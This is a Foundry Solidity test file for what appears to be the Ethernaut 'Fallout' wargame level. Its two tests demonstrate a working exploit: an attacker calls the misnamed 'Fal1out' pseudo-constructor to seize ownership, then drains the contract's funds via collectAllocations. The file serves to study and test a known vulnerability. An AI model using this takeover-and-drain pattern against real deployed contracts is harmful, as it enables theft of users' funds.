// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Fallout} from "../src/Fallout.sol";

contract FalloutTest is Test {
    Fallout falloutContract;
    address attacker = makeAddr("attacker");

    function setUp() public {
        falloutContract = new Fallout();
        vm.deal(attacker, 10 ether);
    }

    function testAttackerCanGainOwnership() public {
        // assert the attcker is not the owner
        assert(falloutContract.owner() != attacker);
        // Call the wrong Fal1out constructor like function
        vm.startPrank(attacker);
        falloutContract.Fal1out();
        vm.stopPrank();
        // assert that the attacker has become the owner
        assertEq(falloutContract.owner(), attacker);
    }

    function testAttackerCanDrainAllTheFunds() public {
        // Call the wrong Fal1out constructor like function, to become the owner
        vm.startPrank(attacker);
        falloutContract.Fal1out();

        // Call collectAllocations to withdraw funds
        falloutContract.collectAllocations();
        vm.stopPrank();

        // assert that the protocol is drained.
        assertEq(address(falloutContract).balance, 0);
    }
}